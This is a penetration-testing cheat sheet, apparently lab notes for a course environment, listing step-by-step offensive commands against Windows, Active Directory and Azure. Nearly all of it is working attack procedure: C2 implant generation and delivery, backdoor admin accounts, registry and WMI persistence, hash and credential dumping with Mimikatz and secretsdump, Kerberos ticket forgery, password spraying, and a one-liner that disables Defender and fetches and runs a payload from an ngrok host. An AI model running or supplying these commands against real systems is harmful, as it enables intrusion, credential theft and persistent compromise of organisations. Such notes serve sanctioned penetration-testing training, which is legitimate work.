# Password Attacks: When to Use Each Technique
### Nohashes
* password guessing
* hydra
* sniffing cleartext
* challenge/response exchanges

### Hashes
* crack the passwords

### NT and LM Windows Hashes
* crack the passwords
* SMB access
* Pass the Hash
    * windwos credentials editor
    * metasploit psexec
    * nmap nse smb

### windows network hashes
* crack the passwords
<br>

# C2Framework
## Service Exploit
### Metasploit
* linux
    * setteing msfconsole
    ```
    msfconsole
    ```
    * search exploits
    ```
    show exploit
    search icecast
    ```
    * choose the exploit
    ```
    use exploit/windows/http/icecast_header
    ```
    * set the payload
    ```
    set PAYLOAD windows/meterpreter/reverse_http
    ```
    * set options
    ```
    show options
    set RHOSTS RHOST_ADDRESS
    set RPORT RHOST_PORT
    set LHOST LHOST_ADDRESS
    ```
    * exploit
    ```
    run
    ```
    * interact session
    ```
    sessions -i SESSION_NUM
    ```
    * gathering
        * systeminfo 
        ```
        sysinfo
        ```
        * usename
        ```
        getuid
        ```
        * process
        ```
        ps
        ```
        * search a specified process
        ```
        ps -S icecast
        ```
        * navegate dir
        ```
        cd c:\\
        ```
        * show current dir
        ```
        pwd
        ```
        * dir listing
        ```
        ls
        ```
        * shell
        ```
        shell
        ```
    * migrate 
        * search process
        ```
        ps -S explorer.exe
        ```
        * migrate command
        ```
        migrate -N explorer.exe
        ```
### shell
* windows
    * ipaddress info
    ```
    ipconfig
    ```
    * look at the users on the system
    ```
    net user
    ```
    * create backdoor account
    ```
    net user BACKDOOR Password1 /add
    ```
    * user info
    ```
    net user BACKDOOR
    ```
    * make user account an administrator
    ```
    net localgroup administrators BACKDOOR /add
    ```
    * look at the members of the administrators group
    ```
    net localgroup administrators
    ```

## Sliver
### Create Payload
* linux 
    * sliver server
        * setup sliver server
        ```
        sudo sliver-server
        ```
        * enable multiplayer mode
        ```
        multiplayer
        ```
        * create a user
        ```
        new-operater -n test -s /tmp/ -l SLIVER_ADDRESS
        sudo chown sec560:sec560 /tmp/*.cfg
        ```

    * sliver client
        * setup the client
        ```
        sliver-client import /tmp/test_SLIVER_ADDRESS.cfg
        ```
        * run the client
        ```
        sliver-client
        ```
        * create the listener
        ```
        https
        ```
        * generate the payload
        ```
        generate --os windows --skip-symbols --name first --http LHOST_ADDRESS
        implants
        ```

### Send Implants
* linux
    * python server
    ```
    python3 -m http.server
    ```
* windows
    * download implants
    ```
    wget http://LHOST_ADDRESS:8000/IMPLANTS_NAME.exe -OutFile a.exe
    ```

### Sessions
* linux
    * show sessions
    ```
    sessions
    ```
    * use a session
    ```
    use ID
    ```
    * get the SID of ther user and group
    ```
    getuid
    getsid
    ```
    * all information
    ```
    info
    ```

### Built-in Post Exploitation
* linux
    * Execute Assembly
    ```
    execute-assembly /home/sec560/labs/SharpWMI.exe action=loggedon
    ```
## Empire
### Setup Listener
* linux
    * empire server
        * launch the server
        ```
        cd /opt/empire
        sudo ./ps-empire server
        ```

    * empire client
        * launch the client
        ```
        cd /opt/empire
        sudo ./ps-empire client
        ```
        * steup listener 
        ```
        uselistener http
        ```
        * set optinos
        ```
        set DefaultDelay 1
        set Port 9999
        set Host http://LINUX_ETH0_ADDRESS:9999
        ```
        * execute
        ```
        execute
        ```
        * check listeners
        ```
        listeners
        ```

### Create Stager
* linux
    * empire client
        * show stagers
        ```
        usestager
        ```
        * select the stager
        ```
        usestager windows/launcher_bat
        ```
        * show options
        ```
        options
        ```
        * setup
        ```
        set Listener http
        ```
        * generate the stager file
        ```
        generate
        ```

### Deploy the Stager
* linux 
    * launch the server
    ```
    cd /opt/empire/empire/client/generated-stagers/
    python3 -m http.server
    ```
* windows
    * download the stager
    ```
    wget http://LINUX_ETH0_ADDRESS:8000/launcher.bat -OutFile launcher.bat
    ```

### Active Agent
* linux
    * empire client
        * show agents
        ```
        agents
        ```
        * interact agent
        ```
        interact AGENT_NAME
        ```
        * get the information
        ```
        info
        ```

### Modules
* linux
    * empire client
        * look at the modules
        ```
        usemodule
        ```
        * most useful of modules
        ```
        usemodule powershell/situational_awareness/host/winenum
        ```
        * run module
        ```
        execute
        ```
        * examie the output of the job
        ```
        view TASK_NUM
        ```

### Looking for Privilege Escalation
* linux 
    * empire client
        * all checks for privilege escalation
        ```
        usemodule powershell/privesc/powerup/allchecks
        execute
        ```
        * attempt dump hashes 
        ```
        usemodule powershell/credentials/powerdump
        execute
        ```
        * check the task
        ```
        view TAKS_NUM
        ```

### UAC Bypass
* linux
    * empire client
        * move back agent
        ```
        back
        ```
        * pops up a UAC prompot
        ```
        usemodule powershell/privesc/ask
        set Listener http
        execute
        ```
        * interat agent2
        ```
        interact AGENT2_NAME
        ```
        * attempt dump hashes 
        ```
        usemodule powershell/credentials/powerdump
        execute
        ```

### Port Scan
* linux
    * port scan from empire agent
    ```
    usemodule powershell/situational_awareness/network/portscan
    set Hosts 10.130.10.10
    execute
    ```
    * view the task results
    ```
    view TASK_NUM
    ```

# Payloads
## Sliver
### Sliver and Payloads
* linux
    * sliver server
        * launch the server
        ```
        sudo sliver-server
        ```
        * setup a listener
        ```
        https
        ```
        * generate dll
        ```
        generate --os windows --arch 64bit --format shared --skip-symbols --http https://LINUX_TUN0_ADDRESS
        ```

### Copying adn Execute DLL
* linux
    * change the permission
    ```
    sudo chown sec560:sec560 *.dll
    ls -l *.dll
    ```
    * upload the dll file
    ```
    smbclient.py hiboxy/bgreen:Password1@10.130.10.25
    use c$
    put PAYLOAD_NAME.dll
    ls
    exit
    ```
    * execute the payload
    ```
    wmiexec.py hiboxy/bgreen:Password1@10.130.10.25
    regsvr32 PAYLOAD_NAME.dll
    ```
    * sliver server
        * interact with the session
        ```
        use SESSION_ID
        ```
        * get information about the session
        ```
        info
        ```
<br>

# Host Servey
## SeatBelt
### Single Checks
* windows
    * get information about current AV
    ```
    Seatbelt.exe -q AntiVirus
    ```
    * look at software
    ```
    Seatbelt.exe -q InstalledProducts
    ```
    * look at the tcp connections like netstat
    ```
    Seatbelt.exe -q TcpConnections
    ```
### Groups
* windows
    * look at system and system group 
    ```
    Seatbelt.exe -q -group=system
    ```
    ```
    All - all commands
    User - current user or all users if logged running with elevated permissions
    System - mines interesting data about the target system
    Slack - modules designed to extract information about slack (is it installed, downloads, and workspaces)
    Chrome - extracts information regarding the Chrome browser (is it installed, bookmarks, history)
    Remote - checks that work on remote systems (very interesting for and before lateral movement)
    Misc - miscellaneous checks
    ```
    * quick way to get a lot of data about the target system
        * AutoRuns - Maybe the executables or their configurations can be modified for persistence or privilege escalation
        ```
        Seatbelt.exe -q AutoRuns
        ```
        * InterestingProcesses - Useful to understand the defensive and administration tools installed on the system
        ```
        Seatbelt.exe -q InterestingProcesses
        ```
        * LocalGroups and LocalUsers - These could be used for escalation or persistence
        ```
        Seatbelt.exe -q LocalGroups
        ```
        * LogonSessions - This is a list of currently logged on users. We could possibly use their access for lateral movement or privilege escalation.
        ```
        Seatbelt.exe -q LogonSessions
        ```
        * NetworkShares - Is our system sharing useful information that others might want/need? Could we add or replace files to gain access to another user or computer?
        ```
        Seatbelt.exe -q NetworkShares
        ```
        * PowerShell - This command let's us know if defensive technologies for PowerShell are enabled. If they are not enabled, we might be able to use PowerShell tools. If the defenses are enabled, then it may be best to avoid PowerShell so we don't trigger alerts.
        ```
        Seatbelt.exe -q PowerShell
        ```
### Remote Usage
* windows
    * remote usage
    ```
    Seatbelt.exe -q | findstr +
    ```
    * run the UAC module
    ```
    Seatbelt.exe -q UAC -computername=10.130.10.25 -username=hiboxy\bgreen -password=Password1
    ```
<br>

# Windows Privilege Escalation
### Run beRoot.exe
* windows
    * find possible privilege escalation issues
    ```
    cd C:\Tools\BeRoot
    beRoot.exe
    ```

### Run PowerUp.ps1
* windows
    * find possible privilege escalation issues
    ```
    cd C:\Tools
    Import-Module .\PowerUp.ps1
    R
    ```
    * run the checks
    ```
    Invoke-AllChecks
    ```

### Exploiting the vulnerability
* windows
    * open the services.msc and look at the vulnable service's path
    ```
    services.msc
    ```
    * exploit
    ```
    Write-ServiceBinary -ServiceName 'Video Stream' -Path 'C:\Program Files\VideoStream\1337.exe'
    ```
<br>

# Persistence
### Generate Payloads
* linux
    * generate payloads with sliver
    ```
    generate --os windows --arch 64bit --skip-symbols --format service --name service --http https://LINUX_ETH0_ADDRESS
    generate --os windows --arch 64bit --skip-symbols --format exe --name payload --http https://LINUX_ETH0_ADDRESS
    ```

### Service Persistence
* windows
    * create a service (admin cmd and need to reboot)
    ```
    sc create persist binpath= "c:\Users\sec560\Desktop\service.exe" start= auto
    ```

### HKCU Run Persistence
* windows
    * create the reg key for the current user (standard cmd)
    ```
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /t REG_SZ /F /D "C:\Users\sec560\Desktop\payload.exe"
    ```

### WMI Event Filter Persistence
* windows
    * create (admin powershell)
    ```
    $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = "UPDATER"; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%fakeuser%'"; QueryLanguage = 'WQL'}
    $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = "UPDATER"; CommandLineTemplate = "C:\Users\sec560\Desktop\payload.exe"}
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
    ```
* linux
    * attempt to login with smbclient
    ```
    smbclient '\\WINDOWS_ETHERNET0_ADDRESS\c$' -U fakeuser fakepass
    ```
<br>

# MSF psexec, hashdumping, and Mimikatz (Need Admin User and Password)
## Metasploit
### Launch Metasploit and get the NT hash
* linux
    * start msfconsole
    ```
    msfcosole
    no
    yes
    ```
    * choose the psexec exploit module (admin user)
    ```
    use exploit/windows/smb/psexec
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOSTS 10.130.10.5
    set LHOST tun0
    set SMBUser bgreen(admin user)
    set SMBDomain hiboxy
    set SMBPass Password1
    run
    ```
    * extract password hashes (DC ONLY)
    ```
    run post/windows/gather/smart_hashdump
    ```
    * extract password hashes
    ```
    run post/windows/gather/hashdump
    ```

## Mimikatz (Need Admin User)
* linux 
    * the target system is 64bit, so it should get 64bit processs
    ```
    ps -A x64 -s
    ```
    * migrate
    ```
    migrate -N spoolsv.exe
    ```
    * so meterpreter can loads Mimikatz
    ```
    load kiwi
    ```
    * get passwords from RAM
    ```
    creds_all
    ```
<br>

# Pivots
## Pivoting Through Meterpreter Session
### Meterpreter
* linux
    * setup msfconsole options that already have gotten credentials by previous pth exercise
    ```
    msfconsole
    use exploit/windows/smb/psexec
    set payload windows/meterpreter/reverse_tcp
    set RHOSTS 10.130.10.21
    set LHOST tun0
    set SMBUser antivirus
    set SMBDomain hiboxy
    set SMBPass aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e
    run
    ```
    * setup the pivot
    ```
    info post/multi/manage/autoroute
    run post/multi/manage/autoroute CMD=add SUBNET=10.130.11.0
    ```
    * check the routingtable
    ```
    background
    route
    ```
    * setup the target ip
    ```
    set RHOSTS 10.130.11.13
    run
    ```
    * dump ntlm hashes
    ```
    run post/windows/gather/hashdump
    ```

## Pivoting with SSH Local Port Forwarding
### SSH
* linux
    * kill all meterpreter sessions
    ```
    exit
    sessions -K
    ```
    * setup ssh port forward
    ```
    ssh bgreen@10.130.10.22 -L 7777:10.130.11.13:445
    ```
    * switch back to metasploit then change the target 
    ```
    set RHOSTS 127.0.0.1
    set RPORT 7777
    run
    run post/windows/gather/hashdump
    ```
<br>

# Kerberos
## Kerberoast
unpriv -> escalate priv
### Enumerate and Request Tickets
* linux
    * use GetUserSPNs.py from impacket
    ```
    GetUserSPNs.py hiboxy.com/bgreen:Password1 -request -dc-ip 10.130.10.4 | tee /tmp/spns.output
    ```

### Crack the Ticket 
* linux
    * save the hashes to a file ready fo cracking
    ```
    grep krb5tgs /tmp/spns.output > /tmp/tickets
    ```
    * crack with hashcat
    ```
    hashcat -m 13100 -a 6 /tmp/tickets /opt/passwords/english-dictionary-capitalized.txt ?d
    hashcat -m 13100 -a 7 /tmp/tickets ?s /opt/passwords/english-dictionary-capitalized.txt
    ```

### Use Stolen Credential
* linux
    * use wmiexec.py to execute commands on DC
    ```
    wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 whoami
    wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 hostname
    wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 net user
    wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 net user SVC_SQLService2
    ```

## Domain Dominance
### Establishing a shell on DC
* linux
    * establish a shell
    ```
    wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4
    ```
### Looking at Shadow Copies
* linux(wmiexec)
    * list the shadow copies
    ```
    vssadmin.exe list shadows
    ```
    * if there is no shadow copy, create one 
    ```
    vssadmin create shadow /for=c:
    ```

### Creating a Copy of NTDS.dit and the System Hive
* linux
    * copy from shadow copy path
    ```
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\extract\ntds.dit
    ```
    * backup the registry
    ```
    reg save hklm\system c:\extract\system /y
    ```

### Copy the NTDS.dit File to Local Machine
* linux
    * copy NTDS.dit file with smbclient.py
    ```
    smbclient.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4
    use c$
    cd extract
    get ntds.dit
    get system
    exit
    ```
### Extracting Hashes
* linux
    * dump hashes
    ```
    secretsdump.py -ntds ~/labs/ntds.dit -system ~/labs/system -outputfile /tmp/hashes.txt LOCAL

## Attacking AD CS
### Initial Query
* windows
    * execute the runas
    ```
    runas /user:hiboxy.com\bgreen /netonly cmd.exe
    ```
    * list all the CA and templates (Administrator)
    ```
    \Tools\Certify.exe cas /domain:hiboxy.com
    ```
### Identifying Vulnerable Templates
* linux
    * use certify to identify vulnerable templates
    ```
    certipy find -u bgreen@hiboxy.com -password Password1 -dc-ip 10.130.10.4
    ```
    *
    ```
    cat *_Certipy.json
    cat *_Certipy.txt | grep -A 18 UserAuthenticationCertificate
    cat *_Certipy.txt | grep -A 40 UserAuthenticationCertificate
    ```
### Requesting a Certificate
* linux
    * 
    ```
    grep "CA Name" *_Certipy.txt
    ```
    *
    ```
    certipy req -username bgreen@hiboxy.com -password Password1 -ca hiboxy-CA01-CA -template UserAuthenticationCertificate -upn administrator@hiboxy.com -target ca01.hiboxy.com
    ```

### Recovering the NT Hash
* linux
    * get the hash
    ```
    certipy auth -pfx administrator.pfx
    ```

## Silver Ticket
### Getting the Information to Build a Ticket
* windows
    * get the domain SID
    ```
    lookupsid.py hiboxy.com/bgreen:Password1@10.130.10.4 520
    ```
    * get the NT hash
    ```
    secretsdump.py hiboxy.com/SVC_SQLService2:^^Cakemaker@10.130.10.4 -just-dc-user file01$
    ```
### Creating the Ticket with Rubeus
* windows
    * get the ticket
    ```
    C:\Tools\Rubeus.exe silver /service:cifs/file01.hiboxy.com /rc4:REDACTED_32768ffb592bbf94774b40 /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ /ptt /user:bgreen
    ```
    * try to access the file server
    ```
    dir \\file01.hiboxy.com\c$
    ```
### A Second Forged Ticket
* windows
    * delete the ticket from memory
    ```
    klist purge
    ```
    * modify the ticket
    ```
    C:\Tools\Rubeus.exe silver /service:cifs/file01.hiboxy.com /rc4:REDACTED_32768ffb592bbf94774b40 /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ /ptt /user:pwned /id:777
    dir \\file01.hiboxy.com\c$
    ```


## Golden Ticket
### Extract secrets of the krbtgt account
* linux 
    * use a secretsdump.py
    ```
    secretsdump.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 -just-dc-user krbtgt
    ```

### Retrieve domain information to create the golden ticket
* linux 
    * get a name of the domain FQDN
    ```
    wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 ipconfig /all
    ```
    * get a domain SID
    ```
    lookupsid.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 520
    ```

### Create a golden ticket
* linux
    * use a ticketer.py
    ```
    ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ -nthash REPLACE_THIS_99e7a0d12fd085d9583 Administrator
    ```

### Using the Golden Ticket
* linux
    * impacket suite
    ```
    export KRB5CCNAME=Administrator.ccache
    ```
    * use the ticket to access the other host
    ```
    export KRB5CCNAME=Administrator.ccache
    wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com hostname
    ```
    * forged a fake user
    ```
    ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ -nthash REPLACE_THIS_99e7a0d12fd085d9583 pwned
    export KRB5CCNAME=pwned.ccache
    wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com whoami
    ```
    Due to a patch, windwos2019 domain controllers with the patch will validate tha username to make sure it the ID.
<br>

# AzureAD
### AzureAD Recon
* windows
    * import an aadinternals module
    ```
    Import-Module AADInternals
    ```
    * gathering users and domain
    ```
    Invoke-AADIntReconAsOutsider -DomainName hiboxy.com | Format-Table
    ```
    * enumerate users
        * 1ユーザ
        ```
        Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com"
        ```
        * 複数ユーザ(DCなどからユーザリストが必要)
        ```
        Get-Content C:\CourseFiles\users.txt | Invoke-AADIntUserEnumerationAsOutsider
        ```
        * 存在するユーザのみを列挙
        ```
        Get-Content C:\CourseFiles\users.txt | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName
        ```

### AzureAD Password Spray Attack
* linux
    * preapare user list and users list
    ```
    /tmp/passwords.txt
    /tmp/users.txt
    ```
    * Spray Attack
        * set the plan(eID,cID指定あり)
        ```
        python3.7 /opt/Spray365/spray365.py generate -d hiboxy.com -u /tmp/users.txt -pf /tmp/passwords.txt --delay 2 -eID https://proxy.cloudwebappproxy.net/registerapp -cID "00b41c95-dab0-4487-9791-b9d2c32c80f2" -ep hiboxy.s365
        ```
        * set the plan(eID,cID指定なし)
        ```
        python3.7 /opt/Spray365/spray365.py generate -d hiboxy.com -u /tmp/users.txt -pf /tmp/passwords.txt --delay 2 -ep hiboxy.s365
        ```
        ```
        -d:         domain
        -u:         list of usernames
        -pf:        list of passwords 
        --delay:    How many seconds between each requeset
        --eID:      endpoint portal(認証で利用するエンドポイント)
                    https://github.com/SecurityRiskAdvisors/msspray
        --cID:      client identifer(認証で利用するアプリケーションID,office 365 managementが無難？)
                    https://learn.microsoft.com/en-us/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in
        --ep:       execution plan filename(実行タスク名)
        ```
        * run
        ```
        python3.7 /opt/Spray365/spray365.py spray -ep hiboxy.s365
        ```
    * Output of Attack
    ```
    cat spray365_results_*.json | jq -r '.[] | select(._auth_complete_success == true) | .credential | "Username: \(.username) Password: \(.password)"'
    ```

### Permission and VM Gathering
* linux
    * login to azure
    ```
    az login -u aparker@hiboxy.com -p Oozle11
    ```
    * resolve Docker IP Issue
    ```
    ip -brief addr show dev docker0 | grep 172 || sudo service docker restart
    ```
    * launch the ScoutSuite container
    ```
    docker run -v /tmp/scoutsuite:/tmp/scoutsuite -it rossja/ncc-scoutsuite
    ```
    * permission gathering
    ```
    scout azure --user-account --report-dir /tmp/scoutsuite
    exit
    ```
    * open with the Firefox
    ```
    firefox /tmp/scoutsuite/azure*.html
    ```
    * vm gatherling
    ```
    az vm list -o table
    ```

### Gaining Access
* linux
    * ngrok
        * setting ngrok
        ```
        ngrok config add-authtoken AUTHTOKEN_GOES_HERE
        ```
        * write to ~/.config/ngrok/ngrok.yml
        ```
        tunnels:
            ngrok9000:
                addr: 9000
                proto: http
            ngrok9001:
                addr: 9001
                proto: http
        ```
        * launching the ngrok
        ```
        ngrok start ngrok9000 ngrok9001
        ```
    * python server
    ```
    python3 -m http.server 9001
    ```
    * sliver
        * setup sliver
        ```
        sliver-server
        ```
        ```
        http -l 9000
        ```
        ```
        generate --os windows --skip-symbols -e --http https://NGROK9000_HOSTNAME_HERE
        ```
    * remotely runnning commands
        * setting payload
        ```
        export TARGET=vm_name
        export NAME=sliver_generated_payloadname
        export NGROK9001=https://ngrok90001_host_name
        ```
        * execute payload
        ```
        az vm run-command invoke --command-id RunPowerShellScript --name $TARGET -g HIBOXY --script 'Set-MpPreference -DisableRealtimeMonitoring $true; wget '"$NGROK9001"'/'"$NAME"'.exe -UserAgent "CustomUA" -OutFile C:\Windows\Temp\'"$NAME"'.exe; SCHTASKS /Create /TN '"$NAME"' /TR "C:\Windows\Temp\'"$NAME"'.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f; SCHTASKS /Run /TN '"$NAME"
        ```
        * when get the reverse shell in the sliver-server, it can execute a shell command
        ```
        shell
        ```

### Lateral Movement
* リバースシェル成功後widows
    * login 
    ```
    az login -i
    ```
    * gathering azure vm
    ```
    az vm list -o table
    ```
* linux
    * extract a payload to execute run-command in azure vm
    ```
    export TARGET=hibox-dc1
    echo az vm run-command invoke --command-id RunPowerShellScript --name $TARGET -g HIBOXY --script 'Set-MpPreference -DisableRealtimeMonitoring $true; wget '"$NGROK9001"'/'"$NAME"'.exe -UserAgent "CustomUA" -OutFile C:\Windows\Temp\'"$NAME"'.exe; SCHTASKS /Create /TN '"$NAME"' /TR "C:\Windows\Temp\'"$NAME"'.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f; SCHTASKS /Run /TN '"$NAME"
    ```
    出力結果を編集  
    1.  次の箇所にシングルクオートをつける。  
        --script 'Set-MpPreference   
    2.  コマンド末尾にシングルクオート  
    * リバースシェル成功後sliver-server
    ```
    shell
    ```
<br>

# Utils
### Search File
* windows
    * powershell Get-ChildItem
    ```
    Get-ChildItem -Path C:\ -Include FILE_REGEX -File -Recurse -ErrorAction SilentlyContinue
    ```

### File Transfer
* linux
    * python server
    ```
    python3 -m http.server
    ```

### SMB
* linux
    * smbserver
    ```
    impacket-smbserver test . -smb2support  -username kourosh -password kourosh
    ```
* windows
    * connect to smbserver
    ```
    net use m: \\KALI_IP\test /user:kourosh kourosh
    ```

### NetCat
* linux
    * listener
    ```
    nc -nvlp 9999 < file.txt
    ```
* windows
    * connect to nc listenter
    ```
    C:\Tools\nc.exe -nv KALI_IP 9999 > file.txt
    ```
<br>

# Responder
## Responder
### Launch Responder
* linux
    * launch responder with tunnel interface
    ```
    sudo /opt/responder/Responder.py -I tun0
    ```
* windows
    * opening an SMB session to \\WINDOWS01

### use JtR
* linux
    * specify the hash-type and cracked NetNTLMv2
    ```
    john --format=netntlmv2 /opt/responder/logs/SMB-NTLMv2-SSP-*
    john --show /opt/responder/logs/SMB-NTLMv2-SSP-*.txt
    ```

## Sniffing
### Launch the tcpdump
* linux
    * launch the tcpdump(one window)
    ```
    sudo tcpdump -nv -w /tmp/winauth.pcap port 445
    ```
    * invoke smbclient (another window)
    ```
    smbclient //YOUR_WINDOWS_IP_ADDRESS/c$ -U clark Qwerty12    
    ```
### Extract Hash
* linux
    * extract hashs
    ```
    sudo Pcredz -vf /tmp/winauth.pcap
    ```
    * crack
    ```
    ls /opt/pcredz/logs/
    cat /opt/pcredz/logs/NTLMv2.txt
    john /opt/pcredz/logs/NTLMv2.txt
    hashcat -w 3 -a 0 -m 5600 /opt/pcredz/logs/NTLMv2.txt /opt/passwords/rockyou.txt
    hashcat -m 5600 --show --outfile-format 2 /opt/pcredz/logs/NTLMv2.txt
    ```
<br>

# Pass the Hash
## Obtaining Hashes
### Metasploit
* linux
    * launch the msfconsole and choose psexec module
    ```
    msfconsole
    use exploit/windows/smb/psexec
    set smbuser bgreen
    set smbpass Password1
    set smbdomain hiboxy
    set rhosts 10.130.10.5
    set lhost tun0
    run
    ```
    * hashdump
    ```
    run post/windows/gather/hashdump
    ```
    * try to use that hash on other systems
    ```
    background
    set smbuser antivirus
    unset smbdomain
    set smbpass aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e
    set rhosts 10.130.10.4,6,21,25,33,44,45
    run
    ```
<br>


# Password Attacks
### hashcat
* linux
    * crack with rule
    ```
    hashcat -m 0 test.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
    ```
    * search hash type
    ```
    hashcat --help | grep -i "MD5"
    ```
    * crack ntlm hash
    ```
    hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
    ```
* windows
    * crack ntlm
    ```
    hashcat.exe -m 1000 web01.hashs rockyou.txt -r rules/best64.rule --force
    ```

### hydra
* linux
    * bruteforce (kali)
    ```
    hydra -l user -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.0.0
    ```
    * bruteforce (slingshot)
    ```
    hydra -l bgreen -P /opt/passwords/simple.txt 10.130.10.10 ssh
    ```
    * http-post  
    ```
    hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.0.0 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
    ```
    * password spray attack
    ```
    hydra -L /usr/share/wordlists/dirb/others/names.txt -p "password" rdp://192.168.0.0
    ```
    * password spray attack to DC(slingshot)  
    ```
    hydra -L /opt/passwords/facebook-f.last100.txt -p Autumn2023 -m workgroup:{hiboxy} 10.130.10.4 smb2
    ```
    * credential attack(slingshot)  
    ```
    hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.4 -m workgroup:{hiboxy} smb2
    ```
    ```
    sec560@slingshot:~$ cat /opt/passwords/hiboxy-breach.txt
    abaird:Kstar123
    aschmitt:Annika0410
    bking:ThaBoss1
    ```

### john
* linux
    * 2john
    ```
    keepass2john Database.kdbx > keepas.hash
    ```
    ```
    ssh2john id_rsa > ssh.hash
    ```
    * normal
    ```
    john --wordlists=/usr/share/wordlists/rockyou.txt ssh.hash
    ```
    * rule
    ```
    john --wordlist=ssh.passwords --rules=sshRules ssh.hash
    ```
    hashcatルールからjohnへのルール変換例
    ```
    kali@kali:~/passwordattacks$ cat ssh.rule
    [List.Rules:sshRules]
    c $1 $3 $7 $!
    c $1 $3 $7 $@
    c $1 $3 $7 $#

    kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
    ```

### Password Spray All Domain Users
* linux
    * Harvesting ad users
    ```
    GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.4 -all | tee /tmp/adusers.txt
    ```
    * Extract users
    ```
    tail -n +6 /tmp/adusers.txt | cut -d ' ' -f 1 | tee /tmp/domainusers.txt
    ```
    * Try spraying
    ```
    hydra -L /tmp/domainusers.txt -p Password1 -m workgroup:{hiboxy} 10.130.10.4 smb2
    ```

### mimikatz
* windows
    * SeDebugPrivilege
        ```
        privilege::debug
        ```
    * token privilege
        ```
        token::elevate
        ```
    * output all password and password hash
        ```
        sekurlsa::logonpasswords
        ```
    * extract NTLM Hash from SAM
        ```
        lsadump::sam
        ```

### smbclient
* linux
    * pass the hash (NTLM)
    ```
    smbclient \\\\192.168.0.0\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
    ```
### psexec
* linux
    * pass the hash (NTLM)
    ```
    impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.0.0
    ```
<br>

# Recon
### nmap
* linux
    * usuful scan
    ```
    sudo nmap -n -sT 10.130.10.0/24 -oA /tmp/scan -F -T4
    ```
    指定のポートがOpenしているホスト
    ```
    grep -w 445/open /tmp/scan.gnmap | cut -d ' ' -f 2
    ```
    * OS Fingerprinting
    ```
    sudo nmap -n -sT -F -O --open 10.130.10.21
    ```
    * Version scan
    ```
    sudo nmap -n -sT -F --open 10.130.10.21 -sV
    ```
    * all port
    ```
    nmap -p- -T4 192.168.0.0
    ```
    * UDP scan
    ```
    sudo nmap -n -sU 10.130.10.4,10 -p 53,111,414,500-501
    ```
    * NSEscript search
    ```
    ls /usr/share/nmap/scripts/smb*.nse
    ```
    * SMB
    ```
    sudo nmap -p 445 -sV --script smb-enum-shares,smb-os-protocols,smb-enum-users,smb-os-discovery 10.130.9.10-12,21,22,39
    ```

### masscan
* linux 
    * setup firewall
    ```
    sudo iptables -A INPUT -p tcp --dport 55555 -j DROP
    ```
    * scan
    ```
    sudo masscan --ports 0-65535 --rate 15000 --src-port=55555 -oB /tmp/local.masscan 127.0.0.1
    ```
    * convert to grepable format
    ```
    masscan --readscan ~/labs/full.masscan -oG /tmp/full.grep
    ```
    * read grepable format
    ```
    cat /tmp/full.grep | sort
    grep -w 445/open /tmp/full.grep
    grep -w 445/open /tmp/full.grep | wc -l
    ```

### gobuster
* linux
    * directory
    ```
    gobuster dir -u http://192.168.0.0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 1000 -o result.txt -k -x php,html --no-error
    ```
<br>

# RDP
### xfreerdp
* linux
    * normal connection
    ```
    xfreerdp /u:user /p:password /v:192.168.0.0
    ```
# NTLM Relay Attack
### ntlmrelayx
* linux
    * launce impacket-ntlmrelayx
    ```
    implacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc <encoded paylaod>"
    ```
